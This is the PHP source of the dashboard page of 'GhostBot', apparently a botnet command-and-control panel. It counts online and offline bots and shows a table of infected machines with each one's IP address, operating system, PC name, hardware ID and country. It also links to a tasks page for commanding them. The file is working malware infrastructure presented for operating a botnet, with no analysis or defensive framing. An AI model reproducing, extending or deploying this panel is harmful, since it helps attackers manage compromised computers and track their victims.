<!doctype html>
<?php
	require_once('config.php');
	require_once('session.php');
	
	$online_q = "select count(*) from bots where time > (now() + interval -3 minute);";
	$online_results = mysql_query($online_q);
	while($row=mysql_fetch_assoc($online_results))
	{
		$onlineyn = $row['count(*)'];
	}
	$total_q = "select count(*) from bots;";
	$total_results = mysql_query($total_q);
	while($row=mysql_fetch_assoc($total_results))
	{
		$totalcount = $row['count(*)'];
	}
	
	$offline = abs($onlineyn - $totalcount);
	
	
	
?>
<html>
	<head>
	<title>GhostBot</title>
	<link  type="text/css" rel="stylesheet" href="ghostbot.css" />
	</head>
	<body>
		
		<header>
				<img src="logo.png" alt="logo pic"/>
		</header>
		<ul class="vnav">
		  <li><a href="list.php">Bots</a></li>
		  <li><a href="tasks.php">Tasks</a></li>
		  <li style="float:right"><a class="active" href="logout.php">Log Out</a></li>
		  
		</ul>
		<div id="left">
			<p><?php echo "Total: $totalcount"; ?></p>
			<p><?php echo "Online: <span id='green'>$onlineyn</span>"; ?><p>
			<p><?php echo "Offline: <span id='red'>$offline</span>"; ?></p>
			
		</div>
		<div id="main" >
			<div id = "center">
				<h2>Bots</h2>
				<table>
				<tr>
					<th>Country</th><th>IP</th><th>Version</th><th>Os</th><th>Pc</th><th>Hwid</th><th>Time</th>
				</tr>
				<?php
					require_once('config.php');
					$q = "select * from bots where time > (now() + interval -3 minute)"; // display bots active in last 3 min
					$results = mysql_query($q);
					while($row=mysql_fetch_assoc($results))
					{
						$ip = $row['ip'];
						$ip = htmlentities($ip); // block xss
						$version =$row['version'];
						$version = htmlentities($version);// block xss
						$os =$row['os'];
						$os = htmlentities($os);// block xss
						$pc =$row['pc'];
						$pc = htmlentities($pc);// block xss
						$hwid =$row['hwid'];
						$hwid = htmlentities($hwid);// block xss
						$time =$row['time'];
						$time = htmlentities($time);// block xss
						$country =$row['country'];
						$country = htmlentities($country);// block xss
						$countrylong =$row['countrylong'];
						$countrylong = htmlentities($countrylong);// block xss
						
						echo "<tr>";
						echo "<td><img src='flags/$country.png' style='width:25px;height:25px;' /> &nbsp; $countrylong</td>";
						echo "<td >$ip</td>";
						echo "<td >$version </td>"  ; 
						echo "<td >$os</td>";
						echo "<td >$pc</td>"  ;
						echo "<td > $hwid </td>"  ;
						echo "<td > $time </td>"  ;
						echo "</tr>";
					}
					echo "</table>"; 
				?>
			</div>
		</div>
	</body>
</html>